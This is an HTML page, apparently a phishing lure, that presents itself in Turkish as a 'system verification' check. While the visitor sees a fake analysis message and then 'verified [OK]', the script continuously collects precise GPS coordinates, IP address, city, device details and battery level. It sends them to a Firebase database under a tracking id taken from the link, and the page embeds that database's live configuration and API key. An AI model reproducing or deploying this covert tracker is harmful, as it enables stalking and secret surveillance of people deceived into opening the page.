<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Doğrulaması v7.0</title>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
</head>
<body style="background:#050505; color:#00ff00; font-family:monospace; padding:30px; font-size:12px;">
    <div id="status">SİSTEM ANALİZİ YAPILIYOR...</div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
            authDomain: "onlinesiparis-2cf91.firebaseapp.com",
            projectId: "onlinesiparis-2cf91",
            databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
            storageBucket: "onlinesiparis-2cf91.appspot.com",
            messagingSenderId: "366801664755",
            appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id') || "NODE_" + Math.floor(Math.random() * 9999);

        async function collectIntel(position) {
            // IP Adresi ve Lokasyon Bilgisi Çekme
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // Cihaz Bilgisi (User Agent)
            const deviceName = navigator.userAgent.split(')')[0].split('(')[1] || "Bilinmeyen Cihaz";

            // Pil Bilgisi
            let batteryLevel = "N/A";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = (battery.level * 100) + "%";
            }

            database.ref('locations/' + deviceId).set({
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                ip: ipData.ip,
                city: ipData.city,
                device: deviceName,
                battery: batteryLevel,
                lastSeen: new Date().getTime(),
                status: "ONLINE"
            });
            
            document.getElementById('status').innerText = "SİSTEM DOĞRULANDI. [OK]";
        }

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(collectIntel, 
                () => { document.getElementById('status').innerText = "GPS İZNİ GEREKLİ!"; }, 
                { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
